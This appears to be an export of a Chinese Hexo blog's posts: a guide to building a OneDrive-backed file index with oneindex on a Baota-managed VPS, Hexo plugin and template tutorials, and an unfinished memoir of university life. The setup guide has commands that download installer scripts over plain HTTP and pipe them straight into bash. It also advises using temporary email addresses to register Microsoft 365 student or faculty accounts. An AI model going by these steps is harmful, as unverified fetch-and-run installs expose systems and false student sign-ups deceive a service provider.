install.sh</span><br></pre></td></tr></table></figure><p><strong>Debian</strong>安装命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><p><strong>Fedora</strong>安装命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O  install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><h2 id="1-3-Nginx和PHP的安装"><a href="#1-3-Nginx和PHP的安装" class="headerlink" title="1.3 Nginx和PHP的安装"></a>1.3 Nginx和PHP的安装</h2><p>​    安装完宝塔面板后，在浏览器中输入<code>vpsip:8888</code>进入宝塔面板，登陆的账号密码在成功安装宝塔后会有提示，根据提示输入登陆就好了，一般情况下第一次登陆宝塔会提示让你安装<code>LNMP</code>环境或者<code>LAMP</code>环境，我们选择安装<code>Nginx+PHP5.6</code>就好了，<code>mysql</code>和<code>phpmyadmin</code>不需要安装</p><p>安装的进度如下，耐心等待安装完成即可。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151700.png" class="lozad"></p><h1 id="0x02-注册365邮箱"><a href="#0x02-注册365邮箱" class="headerlink" title="0x02 注册365邮箱"></a>0x02 注册365邮箱</h1><p>​        临时邮箱网址：<a href="https://t.odmail.cn/" target="_blank" rel="noopener">https://t.odmail.cn/</a> </p><p>复制网页中的邮箱然后选择 <a href="https://signup.microsoft.com/signup?sku=student" target="_blank" rel="noopener"><strong>学生版</strong></a> or <a href="https://signup.microsoft.com/signup?sku=faculty" target="_blank" rel="noopener"><strong>教师版</strong></a> 在注册,记住，页面不要关闭，待会需要接收验证码</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151709.png" class="lozad"></p><p>输入刚刚的邮箱</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812002410.png" class="lozad"></p><p>返回刚刚临时邮箱的页面，接收到验证码了</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151726.png" class="lozad"></p><p>输入验证码</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151732.png" class="lozad"></p><p>输入相关信息完成注册</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151752.png" class="lozad"></p><p>需要用手机号验证一下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151759.png" class="lozad"></p><p>注册完成</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151941.png" class="lozad"></p><h1 id="0x03-安装oneindex"><a href="#0x03-安装oneindex" class="headerlink" title="0x03 安装oneindex"></a>0x03 安装oneindex</h1><h2 id="3-1-注册域名"><a href="#3-1-注册域名" class="headerlink" title="3.1 注册域名"></a>3.1 注册域名</h2><p><a href="https://wanwang.aliyun.com/?spm=5176.12825654.eofdhaal5.69.3dbd2c4aV1flhF" target="_blank" rel="noopener">域名注册地址</a>直接购买，不懂的，出门右拐百度</p><h2 id="3-2-设置域名解析"><a href="#3-2-设置域名解析" class="headerlink" title="3.2 设置域名解析"></a>3.2 设置域名解析</h2><p>在域名管理中设置域名解析</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115151955.png" class="lozad"></p><p>A记录指向是自己的vps ip地址pan是域名的二级域名，也就是pan.xxx.com</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152005.png" class="lozad"></p><h2 id="3-3-安装oneindex"><a href="#3-3-安装oneindex" class="headerlink" title="3.3 安装oneindex"></a>3.3 安装oneindex</h2><p>注册好了onedrive以后，我们现在有5T的空间了，具体有没有5T，会在后面上传的部分介绍如何查看</p><p>首先需要下载oneindex的源码，GitHub下载地址：<a href="https://github.com/donwa/oneindex.git" target="_blank" rel="noopener">onindex</a></p><p>然后登陆宝塔面板，配置一下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152016.png" class="lozad"></p><p>填写自己注册的域名</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152031.png" class="lozad"></p><p>点击进入网站目录</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152041.png" class="lozad"></p><p>然后刚刚下载的oneindex源码上传上去，也可以使用远程下载直接远程下载oneindex的源码，如果是自己上传的，需要解压缩一下，解压完以后如下图：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152056.png" class="lozad"></p><p>然后访问自己的域名直接安装，必须全部都是√才行，如果3,4的权限不够需要在宝塔面板中赋予该文件夹可读可写的权限</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152118.png" class="lozad"></p><p>都是√的可以跳过不看这个</p><p>重新回到宝塔面板给需要赋予权限的两个文件夹赋权</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152125.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152253.png" class="lozad"></p><p>再次刷新，OK，都是√了，</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152341.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152356.png" class="lozad"></p><h1 id="0x04-oneindex的基本设置"><a href="#0x04-oneindex的基本设置" class="headerlink" title="0x04 oneindex的基本设置"></a>0x04 oneindex的基本设置</h1><p>输入<code>域名/?/admin</code>进入oneindex后台管理系统，初始密码是oneindex</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152413.png" class="lozad"></p><p>修改网盘的名称</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152451.png" class="lozad"></p><p>在宝塔中设置定时刷新缓存计划</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152457.png" class="lozad"></p><p>在宝塔面板中添加计划任务</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152745.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152826.png" class="lozad"></p><h1 id="0x05-文件上传"><a href="#0x05-文件上传" class="headerlink" title="0x05 文件上传"></a>0x05 文件上传</h1><h2 id="【方法一-RaiDrive】"><a href="#【方法一-RaiDrive】" class="headerlink" title="【方法一:RaiDrive】"></a>【方法一:RaiDrive】</h2><p>为了方便我们上传文件到网盘中，我们需要用到RaiDrive将网盘映射到本地计算机中，当做本地磁盘来使用，具体操作如下：<br>RaiDrive下载:<a href="https://www.raidrive.com/" target="_blank" rel="noopener">官网地址</a>,<a href="http://t.cn/EZKRDHl" target="_blank" rel="noopener">蓝奏云盘</a></p><p>下载完以后就是一步步安装了，傻瓜式操作，下面主要讲一下安装完以后如何将网盘映射到本地</p><p>首先，安装好的RAIDrive是英文的，不习惯得话可以设置成中文，如图</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152845.png" class="lozad"></p><p>然后将网盘映射到本地，操作如下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152858.png" class="lozad"></p><p>点击接受</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152911.png" class="lozad"></p><p>耐心等待一会以后</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152928.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115152935.png" class="lozad"></p><h2 id="【方法二-onedrive客户端】"><a href="#【方法二-onedrive客户端】" class="headerlink" title="【方法二:onedrive客户端】"></a>【方法二:onedrive客户端】</h2><p>搜索onedrive客户端，一般Windows10都自带了，如果没有的话可以在网上下载。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115153519.png" class="lozad"></p><p>输入账号密码后登陆成功，然后点击onedrive图标，打开文件夹，将需要上传的文件直接复制到该文件夹中，</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115154957.png" class="lozad"></p><p>上传成功后，文件夹上会有一个绿色的对号，说明都上传成功了，这个时候的状态是文件既在云端，也在本地。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115154940.png" class="lozad"></p><p>查看文件夹属性可以看出来大小是这个文件的大小，占用空间是占用本地的空间。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115155236.png" class="lozad"></p><p>右击，选择释放空间，然后等待一会，系统会自动删除本地的文件，保留云端的文件。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115155327.png" class="lozad"></p><p>注：有些朋友可能和我刚开始一样，右击没有显示释放空间这个选项，我记得好像是改什么通知什么的，具体的也忘记了，所以就需要大家自己百度解决了。</p><p><img alt="img" data-src="https://i04piccdn.sogoucdn.com/c9643d38167bafb6" class="lozad"></p><h1 id="0x06-碰到的问题"><a href="#0x06-碰到的问题" class="headerlink" title="0x06 碰到的问题"></a>0x06 碰到的问题</h1><h2 id="3-4-授权5T空间的时候碰到错误"><a href="#3-4-授权5T空间的时候碰到错误" class="headerlink" title="3.4 授权5T空间的时候碰到错误"></a>3.4 授权5T空间的时候碰到错误</h2><p><strong>问题描述：</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115153048.png" class="lozad"></p><p><strong>问题原因：</strong></p><p>没有使用开通5T onedrive空间的账号登陆</p><p><strong>解决方法：</strong></p><p>如果有5T 的onedrive空间的账号，直接使用该账号登陆即可，如果没有的话，需要自己重新注册一个即可。</p><h2 id="3-5-网盘文章打开404"><a href="#3-5-网盘文章打开404" class="headerlink" title="3.5 网盘文章打开404"></a>3.5 网盘文章打开404</h2><p><strong>问题描述：</strong></p><p>上传到网盘的文件，点击打开以后显示404</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115153101.png" class="lozad"></p><p>问题原因：</p><p>没有设置伪静态，导致访问文件时找不到资源文件。</p><p>解决方法：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115153118.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115153123.png" class="lozad"></p><p>设置好以后再次访问域名，发现里面的文件夹和文件都可以直接点击查看</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115153145.png" class="lozad"></p><h2 id="3-6-解决图片打开是404问题"><a href="#3-6-解决图片打开是404问题" class="headerlink" title="3.6 解决图片打开是404问题"></a>3.6 解决图片打开是404问题</h2><p>将伪静态替换成下面</p> <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^./files/(.)</span> /wp-includes/ms-files.php?file=<span class="number">1</span> <span class="literal">last</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span> (!-e <span class="variable">$request_filename</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^.+?(/wp-.*)</span> <span class="variable">$1</span> <span class="literal">last</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^.+?(/.*.php)$</span> <span class="variable">$1</span> <span class="literal">last</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^</span> /index.php <span class="literal">last</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功访问</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115153239.png" class="lozad"></p><p><strong>参考链接：</strong></p><p><a href="https://www.52pojie.cn/thread-847650-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-847650-1-1.html</a></p><p> <a href="https://github.com/donwa/oneindex" target="_blank" rel="noopener">https://github.com/donwa/oneindex</a></p><p> <a href="https://blog.csdn.net/github_39533414/article/details/83687260" target="_blank" rel="noopener">https://blog.csdn.net/github_39533414/article/details/83687260</a></p><p> <a href="https://www.moerats.com/archives/592/" target="_blank" rel="noopener">https://www.moerats.com/archives/592/</a></p><p> <a href="http://www.sumbk.com/339.html" target="_blank" rel="noopener">http://www.sumbk.com/339.html</a></p><p> <a href="http://blog.jialezi.net/?post=120" target="_blank" rel="noopener">http://blog.jialezi.net/?post=120</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 其他教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oneindex </tag>
            
            <tag> onedrive </tag>
            
            <tag> 个人网盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给博客添加豆瓣书架功能</title>
      <link href="/2019/08/09/%E7%BB%99%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E8%B1%86%E7%93%A3%E4%B9%A6%E6%9E%B6%E5%8A%9F%E8%83%BD/"/>
      <url>/2019/08/09/%E7%BB%99%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E8%B1%86%E7%93%A3%E4%B9%A6%E6%9E%B6%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在一次浏览个人博客网站的过程中，返现有个网站有豆瓣读书的功能，可以在页面展示自己读了哪些书，想看哪些书等，我觉得这个功能特别的好，可以记录自己的读书，还可以在读完以后写上自己的书评。下面来给大家讲讲怎么在自己的博客中实现这个功能。</p><a id="more"></a><p>#0x01 成品展示</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114153252.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114153304.png" class="lozad"></p><p>#0x02 需求配置</p><p>##2.1 安装插件</p><p>在博客的根目录下输入命令安装</p><p><code>npm install hexo-douban --save</code></p><p>##2.2 站点配置文件中添加配置</p><p>在<code>Hexo</code>站点根目录配置文件<code>_config.xml</code>中的末尾添加如下配置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">douban:</span><br><span class="line">   user: mythsman</span><br><span class="line">   builtin: false</span><br><span class="line">   book:</span><br><span class="line">     title: <span class="string">'This is my book title'</span></span><br><span class="line">     quote: <span class="string">'This is my book quote'</span></span><br><span class="line">   movie:</span><br><span class="line">     title: <span class="string">'This is my movie title'</span></span><br><span class="line">     quote: <span class="string">'This is my movie quote'</span></span><br><span class="line">   game:</span><br><span class="line">     title: <span class="string">'This is my game title'</span></span><br><span class="line">     quote: <span class="string">'This is my game quote'</span></span><br><span class="line">   timeout: <span class="number">10000</span></span><br></pre></td></tr></table></figure><blockquote><p>上面参数说明：</p><ul><li><strong>user</strong>: 你的豆瓣ID.打开豆瓣，登入账户，然后在右上角点击      “个人主页” ，这时候地址栏的URL大概是这样：”<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.douban.com%2Fpeople%2Fxxxxxx%2F" target="_blank" rel="noopener">https://www.douban.com/people/xxxxxx/</a>“      ，其中的”xxxxxx”就是你的个人ID了。</li><li><strong>builtin</strong>: 是否将生成页面的功能嵌入hexo s和hexo      g中，默认是false,另一可选项为true(1.x.x版本新增配置项)。</li><li><strong>title</strong>: 该页面的标题.</li><li><strong>quote</strong>: 写在页面开头的一段话,支持html语法.</li><li><strong>timeout</strong>: 爬取数据的超时时间，默认是 10000ms      ,如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。</li></ul></blockquote><p>由于<code>hexo-douban</code>是默认抓取豆瓣读书、豆瓣电影以及豆瓣游戏的，如果只想要其中一部分，可以把其它部分在上述配置文件中去掉即可。</p><h1 id="0x03-启用使用"><a href="#0x03-启用使用" class="headerlink" title="0x03 启用使用"></a>0x03 启用使用</h1><p>插件安装好了，需要配置的也配置好了，下面就需要生成我们的豆瓣书架、电影页面了。</p><p>##3.1 生成页面</p><p>在GitBash下输入命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  <span class="comment">#清除之前生成的文件</span></span><br><span class="line">hexo douban -bmg   <span class="comment">#生成豆瓣书籍、电影、游戏页面</span></span><br><span class="line">hexo g             <span class="comment">#生成文章</span></span><br><span class="line">hexo s           <span class="comment">#启动本地服务器</span></span><br><span class="line">hexo deploy        <span class="comment">#上传部署</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-bgm代表的是book、game、movie三个参数，如果只需要其中的一部分就只带你想要的那些参数。</span></span><br></pre></td></tr></table></figure><blockquote><p>注：由于<code>hexo douban</code>的简写也是hexo d，与hexo deploy的简写指令hexo d冲突，因此在进行二者部署的时候，只能都打全名而不能打简写形式</p></blockquote><p>##3.2 测试</p><p>如果在<code>hexo douban -bmg</code>这步没有问题的话，会出现如下信息</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114153320.png" class="lozad"></p><p>然后我们只需要在站点目录下测试<a href="http://localhost:4000/books" target="_blank" rel="noopener">http://localhost:4000/books</a> 或者 <a href="http://localhost:4000/movies等，如果看到页面了就说明成功了。" target="_blank" rel="noopener">http://localhost:4000/movies等，如果看到页面了就说明成功了。</a></p><p>##3.3 配置</p><p>如果上述都没有问题，我们就可以在菜单栏中添加按钮了，打开主题配置文件<code>_config.xml</code>，找到菜单按钮，可以选择性的添加下面内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: /</span><br><span class="line">  archives: /archives</span><br><span class="line">  books: /books     <span class="comment"># 这是链接到books页面</span></span><br><span class="line">  movies: /movies   <span class="comment">#  这是链接到movies页面</span></span><br><span class="line">  games: /games   <span class="comment"># 这是链接到games页面</span></span><br></pre></td></tr></table></figure><p>注意添加完成之后按钮并不是中文的，这是由于在languages文件夹下面的<code>zh-CN</code>（中文语言配置文件）没有添加上述对应的中文参数信息，所以我们需要主动添加,语言文件夹在你的主题配置文件夹下面，如下图</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114153334.png" class="lozad"></p><p>在<code>menu</code>菜单下添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  books: 阅读</span><br><span class="line">  movies: 电影</span><br><span class="line">  games: 游戏</span><br></pre></td></tr></table></figure><p>#0x04 碰到的问题</p><p>输入<code>hexo douban -bg</code>以后，发现没有按照教程一样产生相关的页面</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114153346.png" class="lozad"></p><p>在网上百度，<code>Google</code>了好久都没有相关的问题，只有相关的教程，也重装了无数次，还是不成功，但是这个插件明明是支持next主题的，所以我就在虚拟机里面重新搭建了一个干干净净的博客，然后安装上这个插件后，发现可以正常产生页面的。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114153405.png" class="lozad"></p><p>所以断定，肯定是我的博客配置出现了问题而不是插件的问题了，在精确定位一下问题：要么是主题的配置的问题，要么的<code>hexo</code>的配置问题，要么是可能去之前安装的功能插件冲突。</p><p>通过将原始的配置复制到我的博客中，发现产生，同构将我博客中的配置文件复制到原始的配置中，发现不能产生，从而断定了问题是出在<code>hexo</code>的站点配置文件中，因为我直接将新的站点配置文件复制进去是可以正常产生页面的。所以在进一步排查到底是站点配置文件中的什么配置出了问题。</p><p>最后查出，原来是<code>douban:</code>前面多了空格，必须要顶格才行。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114153418.png" class="lozad"></p><p>再次运行<code>hexo douban -bmg</code>成功生成<code>books</code>和<code>games</code>页面。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114153429.png" class="lozad"></p><p>#0x05 参考链接</p><p><a href="https://github.com/mythsman/hexo-douban" target="_blank" rel="noopener">https://github.com/mythsman/hexo-douban</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 其他文章 </category>
          
          <category> hexo博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 豆瓣书架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义hexo创建文章的模板</title>
      <link href="/2019/08/02/%E8%87%AA%E5%AE%9A%E4%B9%89hexo%E5%88%9B%E5%BB%BA%E6%96%87%E7%AB%A0%E7%9A%84%E6%A8%A1%E6%9D%BF/"/>
      <url>/2019/08/02/%E8%87%AA%E5%AE%9A%E4%B9%89hexo%E5%88%9B%E5%BB%BA%E6%96%87%E7%AB%A0%E7%9A%84%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p>#0x00 前言</p><p>在众多的博客中，我选择了<code>hexo</code>，最大的优势就是可以结合<code>GitHub page</code>来搭建一个免费的个人博客系统，将文章都托管到<code>GitHub</code>上，在也不用担心服务器过期的问题了，而且可以自己买一个域名，解析了<code>GitHub</code>上就可以直接使域名访问了。很多小伙伴给自己个博客添加了很多其他的功能，但是每次写文章的时候都需要在文章的开头去写一遍，这简直就是重复造轮子。其实，你可以自己在<code>scaffolds</code>中去修改属于你自己的模板</p><a id="more"></a><p>#0x01 目录了解</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">hexo-install-directory</span><br><span class="line">├── CNAME</span><br><span class="line">├── _config.yml  //Hexo的配置文件，可以配置主题、语言等</span><br><span class="line">├── avatar.jpg</span><br><span class="line">├── db.json</span><br><span class="line">├── debug.log</span><br><span class="line">├── node_modules</span><br><span class="line">├── public     //执行hexo g命令后，生成的内容会在这里，包括所有的文章、页面、分类、tag等.</span><br><span class="line">├── scaffolds    //保存着默认模板，自定义模板就是修改该目录下的文件</span><br><span class="line">│   ├── draft.md //默认的草稿模板</span><br><span class="line">│   ├── page.md  //默认的页面模板</span><br><span class="line">│   └── post.md  //默认的文章模板</span><br><span class="line">├── source  //Hexo存放编辑页面的地方，可以使用vim或其他编辑器编辑这里的内容</span><br><span class="line">│   ├── 404.html //自定义404页面，可以使用腾讯公益404页面</span><br><span class="line">│   ├── Staticfile </span><br><span class="line">│   ├── _drafts  //存放所有的草稿文件的目录</span><br><span class="line">│   ├── _posts //存放所有的文章文件的目录，用的最多，比如执行hexo n "post_name"之后，post_name这篇文章就存放在这个目录下</span><br><span class="line">│   ├── categories</span><br><span class="line">└── themes //Hexo的所有主题</span><br><span class="line">    ├── landscape //原始hexo主题</span><br><span class="line">    ├── next     //这是我目前用的主题</span><br></pre></td></tr></table></figure><h1 id="0x02-修改步骤"><a href="#0x02-修改步骤" class="headerlink" title="0x02 修改步骤"></a>0x02 修改步骤</h1><p>在博客的<code>scaffolds</code>目录下有三个<code>md</code>文档，只需要改<code>post.md</code>即可。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114161958.png" class="lozad"></p><p>我的模板</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">----</span><br><span class="line">title: &#123;&#123; title &#125;&#125;  //文章标题</span><br><span class="line">date: &#123;&#123; date &#125;&#125;    //文章创建时间</span><br><span class="line">permalink:          //文章显示连接</span><br><span class="line">categories:         //文章匪类目录</span><br><span class="line">tags: []            //文章标签，可多个，用，隔开</span><br><span class="line">description:        //文章描述</span><br><span class="line">image:              //自定义的文章摘要图片，只在页面展示，文章内消失</span><br><span class="line">copyright: true     //增加底部的版权信息（需要配置）</span><br><span class="line">-----</span><br><span class="line">//首页文章展示缩略图</span><br><span class="line">&lt;img src=&quot;https://&quot; alt=&quot;&quot; style=&quot;width:100%&quot; /&gt;  </span><br><span class="line"></span><br><span class="line">0x00 前言</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line">## 0x01 </span><br><span class="line"></span><br><span class="line">## 0x02</span><br><span class="line"></span><br><span class="line">## 0x03</span><br><span class="line"></span><br><span class="line">## 0x04</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;hr /&gt;</span><br><span class="line">版权信息</span><br></pre></td></tr></table></figure><p>模板图片如下:</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162011.png" class="lozad"></p><p>#0x03 效果展示</p><p>首页预览</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162020.png" class="lozad"></p><p>文章详情</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162032.png" class="lozad"></p><p>版权信息</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114162050.png" class="lozad"></p><p>## </p><hr>]]></content>
      
      
      <categories>
          
          <category> 其他文章 </category>
          
          <category> hexo博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文章模板 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的大学生活</title>
      <link href="/2019/07/01/%E6%88%91%E7%9A%84%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%B4%BB/"/>
      <url>/2019/07/01/%E6%88%91%E7%9A%84%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%B4%BB/</url>
      
        <content type="html"><![CDATA[<p>#0x00 前言</p><p>​    我大学读的是计算机科学与技术专业，说实话，这个专业真的太大了，囊括了整个计算机的大类，所以学校的课程中，什么都学，什么计算机导论，离散数学，<code>Java</code>，<code>C</code>，<code>C#</code>，数据库，<code>JSP</code>等等，但是教的都是一些基本的皮毛知识，有些连入门都不算，所以要想在某个知识有所突破，基本上都是靠自己去图书馆借书回来学习。</p><a id="more"></a><p>​    在大学中，如果按照学习来分类的话，有这么几个人。第一类人——学神，听过这类人特别牛X，不光学习好，年年拿国家励志奖学金，而且还有这种职位，比如学社会主席，某某大赛领队人….；第二类人——学霸，他们是上课认真听讲，课下不用复习，靠前突击复习。期末稳稳优秀，我宿舍就有几个，哈哈哈，我们宿舍在班上也算是男生中的学霸宿舍了；第三类人——学渣，他们是上课玩手机，下课打游戏，吃饭叫外卖，考试靠小抄。</p><h1 id="0x01-大一"><a href="#0x01-大一" class="headerlink" title="0x01 大一"></a>0x01 大一</h1><p>​    大一小萌新，充满着对大学的憧憬，然后大一也是最惨的，学生会中部长对大一干部喝来喝去，一副官腔样，贼恶心。除了这些大一小萌新还会在志愿者协会参加各种户外和校内的志愿者活动，只为了志愿者证书上的那60小时志愿工时，不过我在大一的时候为了多见见世面，参加了不少志愿活动，大大小小的积累下来有100多个工时。不过最后被我弄丢了╮(╯▽╰)╭然后就是我在大学还参加一个社团叫剪纸协会（非物质文化遗产奥），不过我在里面也是混日子，没有学到多少技能，到是吧脸皮练厚了，哈哈哈。这就样大一结束。</p><p>#0x02 大二</p><p>​    